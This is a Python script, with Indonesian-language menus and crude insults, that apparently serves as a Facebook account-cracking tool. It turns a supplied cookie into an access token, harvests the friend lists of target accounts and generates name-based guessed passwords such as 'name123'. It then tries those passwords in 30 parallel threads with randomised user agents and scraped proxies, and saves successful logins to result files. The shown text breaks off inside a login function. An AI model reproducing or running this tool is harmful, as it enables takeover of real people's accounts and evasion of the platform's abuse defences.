#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text as tekz
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.text import Text as tekz
from rich.text import Text
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
#------------------[ WARNA-INSTALL ]-------------------#
P = '\x1b[1;97m' # PUTIH
K = '\x1b[1;93m' # KUNING
#------------------[ INSTALL-MODULE ]-------------------#
try:
        import requests
except ImportError:
        cetak(panel('\t•[bold yellow]sedang menginstall modul requests •'))
        os.system('pip install requests')
try:
        import bs4
except ImportError:
        cetak(panel('\t•[bold yellow]sedang menginstall modul bs4 •'))
        os.system('pip install bs4')
try:
        import rich
except ImportError:
        cetak(panel('\t•[bold yellow] sedang menginstall modul rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(panel('\t•[bold yellow]sedang menginstall sodul stdiomask •'))
        os.system('pip install stdiomask')
#-----------------[ IMPORT-MODULE ]-------------------#
pretty.install()
proxxy=[]
url=[]
ugen,ugen2=[],[]
dump,id,akun=[],[],[]
method,tokenku=[],[]
pwpluss,pwnya=[],[]
uadia, uadarimu = [],[]
lisensiku,lisensikuni=[],[]
id,id2,uid=[],[],[]
loop,ok,cp =0,0,0
CON=sol()
console = Console()
ses=requests.Session()
sys.stdout.write('\x1b]2; (TOOLS KG_BLACK) \x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(proxy)
except Exception as e:
    proxy=open('.prox.txt','r').read().splitlines()	
for t in range(10000):
	rr = random.randint
	andro=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
	rmx=random.choice(['Redmi 7','Redmi Note 8','Redmi 6A','Mi 9 Lite','Redmi Note 11 Pro','Redmi 5A','Mi 9 SE','POCO M4 Pro','POCO X3 Pro','Redmi 5 Plus','Redmi Note 10 Pro','M2007J22G','Redmi 9C NFC'])
	build=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	vbuild=random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
	mark=random.choice(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
	rfn1=f'Mozilla/5.0 (Linux; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn2=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn3=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn4=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn5=f'Mozilla/5.0 (Linux; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn6=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn7=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn8=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn9=f'Mozilla/5.0 (Linux; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn10=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn11=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn12=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn13=f'Mozilla/5.0 (Linux; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn14=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn15=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	rfn16=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	uaku2 = random.choice([rfn1,rfn2,rfn3,rfn4,rfn5,rfn6,rfn7,rfn8,rfn9,rfn10,rfn11,rfn12,rfn13,rfn14,rfn15,rfn16])
	ugen.append(uaku2)
#------------[ WARNA-RICH ]---------------#
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_text = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	color_text = "#00C8FF"
#------------[ WARNA-PRINT-RICH ]---------------#
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
#------------[ WARNA-TEMA ]---------------#
P = '\x1b[1;97m'# WARNA-PUTIH
M = '\x1b[1;91m' # WARNA-MERAH
K = '\x1b[1;93m' # WARNA-KUJING
H = '\x1b[1;92m' # WARNA-HIJAU
U = '\x1b[1;95m' # WARNA-UNGU
B = '\x1b[1;94m' # WARNA-BIRU
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#--------------------[ CHECK-TAHUN ]--------------#
def cektahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
#------------------[ MACHINE-SUPPORT ]---------------#
def sayang(mama):
        for sayang in mama + "\n":sys.stdout.write(sayang);sys.stdout.flush();time.sleep(0.01)
def kopi(): 
	print(f'{K}╭────────────────────────────────────────────{P}')
def clear():
	os.system('clear')
def back():
	login() 
#------------------[ BANNER-LAKNAT]-----------------#
def banner():
	clear()
	print(f'''\t{B}
   ███████╗██╗   ██╗██████╗  ██████╗██╗  ██╗██╗   ██╗
   ██╔════╝██║   ██║██╔══██╗██╔════╝██║  ██║╚██╗ ██╔╝
   ███████╗██║   ██║██████╔╝██║     ███████║ ╚████╔╝ 
   ╚════██║██║   ██║██╔══██╗██║     ██╔══██║  ╚██╔╝  
   ███████║╚██████╔╝██║  ██║╚██████╗██║  ██║   ██║   
   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   
        {H}''')
    	
###----------[ NGECEK COOKIES ]----------###
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print('[!] ConnectionError')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		cok = input('\n[!] Masukan Cookie : ')
		ses.headers.update(
			{
				'content-type': 'application/x-www-form-urlencoded',
			}
		)
		data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''
		}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop(
			'content-type'
		)
		ses.headers.update(
			{
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
			}
		)
		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			exit('\n[!] cookie invalid')
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'qr': 0,
				'user_code': user_code,
			}
			ses.headers.update(
				{
					'origin': 'https://m.facebook.com',
					'referer': verification_url,
					'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
				}
			)
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
				ses.headers.update(
					{
						'origin': 'https://m.facebook.com',
						'referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
					}
				)
				data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'scope': scope,
					'display': display,
					'user_code': user_code,
					'logger_id': logger_id,
					'auth_type': auth_type,
					'encrypted_post_body': encrypted_post_body,
					'return_format[]': return_format,
				}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				ses.headers.update(
					{
						'referer': 'https://m.facebook.com/',
					}
				)
				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
				if 'Sukses!' in str(response6):
					ses.headers.update(
						{
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
						}
					)
					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
					access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
					tokenw = open(".token.txt", "w").write(access_token)
					cokiew = open(".cok.txt", "w").write(cok)
					print('\n[!] Login  berhasil jalankan ulang perintah nya')
				else:
					back('\n[+] login gagal')
		
	except Exception as e:
		print('\n Cookies Invalid Bro')
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies telah modar ')
		time.sleep(2)
		login_lagi334()
	os.system('clear')
	banner()
	print(f'{K}└── [{P}+{K}]{P} AUTHOR : @KG_BLACK ')
	print(f'{K}└── [{P}+{K}]{P} TG : SURCHY_CRACKER')
	kopi()
	print(f'{K}└── [{P}01{K}]{P} Crack Publik ')
	print(f'{K}└── [{P}02{K}]{P} Check Result    ')
	print(f'{K}└── [{P}00{K}]{P} Hapus Kukis	')
	kopi()
	_Cyx_Xion_XD_ = input(f'{K}└── [{P}+{K}]{P} Pilih {H}: ')
	kopi()
	if _Cyx_Xion_XD_ in ['1','01']:
		crack_publik()
	elif _Cyx_Xion_XD_ in ['2','02']:
		cek_result()
	elif _Cyx_Xion_XD_ in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'{K}└── [{P}+{K}]{M} Sukses Hapus Kukis ')
		back()
	else:
		print(f'{K}└── [{P}+{K}]{M} Pilih Yang Bener Asu ')
		back()

#Crack Publick
def crack_publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{K}└── [{P}+{K}]{P} Berapa Target {H}: '))
	except ValueError:
		print(f'{K}└── [{P}+{K}]{M} Masukkan Angka Anjing, Malah Huruff 🗿')
		back()
	if jum<1 or jum>100:
		print(f'{K}└── [{P}+{K}]{M} Gagal Dump Idz ')
		back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{K}└── [{P}+{K}]{P} Idz Target Ke{H} '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f'{K}└── [{P}+{K}]{M} Sinyal Loh Kek Kontoll ')
			back()
	try:
		print(f'{K}└── [{P}+{K}]{P} Total Idz Target {H}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(f'{K}└── [{P}+{K}]{M} Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'{K}└── [{P}+{K}]{M} Pertemanan Tidak Public ')
		time.sleep(3)
		back()
		
#Result
def cek_result():
	kopi()
	print(f'{K}└── [{P}01{K}]{P} Hasil OK ')
	print(f'{K}└── [{P}02{K}]{P} Hasil CP')
	kopi()
	kz = input(f'{K}└── [{P}+{K}] {P} Pilih{H} : {P}')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f'{K}└── [{P}+{K}]{M} File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f'{K}└── [{P}+{K}]{M} Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'☞  %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'{K}└── [{P}+{K}]{P} Pilih {H}: ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'{K}└── [{P}+{K}]{M} Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f'{K}└── [{P}+{K}]{M} File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{K}└── {M}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			input(f'{K}└── [{M} Klik Enter {K}]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f'{K}└── [{P}+{K}]{M} File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f'{K}└── [{P}+{K}]{M} Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'☞ %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'☞ %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'{K}└── [{P}+{K}]{M} Pilih {H} : {P}')
			try:geh = lol[geeh]
			except KeyError:
				print(f'{K}└── [{P}+{K}]{M} Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f'{K}└── [{P}+{K}]{M} File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{K}└──{M} {H}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			input(f'{K}└── [{M} Klik Enter {K}]')
			back()
	elif kz in ['3']:
		back()
	else:
		print(f'{K}└── [{P}+{K}]{M} Pilih Yang Bener Kontol ')
		back()								
						
#-------------[ MENU-IDZ-TARGET ]---------------#		
def setting():
	kopi()
	print(f'{K}└── [{P}01{K}]{P} Idz Tua ')
	print(f'{K}└── [{P}02{K}]{P} Idz Muda  ')
	print(f'{K}└── [{P}03{K}]{P} Idz Random	')
	kopi()	
	hu = input(f'{K}└── [{P}+{K}]{P} Pilih Urutan Idz{H} : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f'{K}└── [{P}+{K}]{M} Pilih Yang Bener Kontooll ')
		back()
		
#-------------[ MENU-URL-LOGIN ]---------------#
	kopi()
	print(f'{K}└── [{P}01{K}]{P} Mobile ')
	print(f'{K}└── [{P}02{K}]{P} Mbasic  ')
	print(f'{K}└── [{P}03{K}]{P} Free	')
	print(f'{K}└── [{P}04{K}]{P} Async	')
	kopi()
	jancok = input(f'{K}└── [{P}+{K}]{P} Pilih Url Login{H} : ')
	if jancok in ['1','01']:
		method.append('mobile')
	elif jancok in ['2','02']:
		method.append('mbasic')
	elif jancok in ['3','03']:
		method.append('free')
	elif jancok in ['4','04']:
		method.append('async')
	else:
		method.append('mobile')
	kopi()
	pwplus=input('└── Add Password Manual ( Y/t ) ')
	kopi()
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input('└── Enter Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()	
		
#Bagian Wordlist	
def passwrd():
	global prog,des
	kopi()
	print(f'{K}└── [{P}+{K}]{P} MAINKAN MODE PESAWAT 300 IDZ{P}\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'1234567890')
						pwv.append(frs+'321')
						pwv.append(frs+'54321')
						pwv.append('123'+frs)
						pwv.append('1234'+frs)
						pwv.append('12345'+frs)
						pwv.append(frs+'123456')
						pwv.append(frs+'123123')
						pwv.append(frs+'1212')
						pwv.append(frs+'12344321')
						pwv.append(frs+'123321')
						pwv.append(frs+'12341234')
						pwv.append(frs+'@123')
						pwv.append(frs+'@1234')
						pwv.append(frs+'@12345')
						pwv.append(frs+'@123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'1234567890')
						pwv.append(frs+'321')
						pwv.append(frs+'54321')
						pwv.append('123'+frs)
						pwv.append('1234'+frs)
						pwv.append('12345'+frs)
						pwv.append(frs+'123456')
						pwv.append(frs+'123123')
						pwv.append(frs+'1212')
						pwv.append(frs+'12344321')
						pwv.append(frs+'123321')
						pwv.append(frs+'12341234')
						pwv.append(frs+'@123')
						pwv.append(frs+'@1234')
						pwv.append(frs+'@12345')
						pwv.append(frs+'@123456')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
				    pool.submit(metod1,idf,pwv)
				elif 'mbasic' in method:
				    pool.submit(metod2,idf,pwv)
				elif 'free' in method:
				    pool.submit(metod3,idf,pwv)
				elif 'async' in method:
				    pool.submit(metod4,idf,pwv)
				else:
				    pool.submit(metod1,idf,pwv)
	kopi()
	print(f'{K}└── [{H}+{K}]{P} Crack Telah Selesai Semoga Anda Bersyukur Dengan Hasilnya : )')
	print(f'{K}└── [{H}+{K}]{H} OK {K}: {H}%s'%(ok))
	print(f'{K}└── [{K}+{K}]{K} CP {K}: {K}%s'%(cp))

#-------------[ URL-LOGIN-VALIDATE]---------------#
def metod1(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[bold green]{idf}[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
